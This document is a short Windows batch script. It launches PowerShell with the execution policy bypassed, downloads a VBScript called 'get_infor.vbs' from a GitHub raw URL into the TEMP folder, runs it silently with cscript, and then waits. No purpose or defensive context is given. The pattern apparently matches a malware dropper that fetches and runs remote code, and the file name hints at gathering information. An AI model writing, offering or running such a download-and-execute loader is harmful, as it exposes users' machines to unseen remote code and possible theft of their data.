%echo


powershell -noprofile -executionpolicy bypass -command "Invoke-RestMethod -Uri "https://raw.githubusercontent.com/hoanggiang-4897/install/main/get_infor.vbs" -OutFile "$env:TEMP\get_infor.vbs"; cscript //nologo "$env:TEMP\get_infor.vbs""


timeout /t 5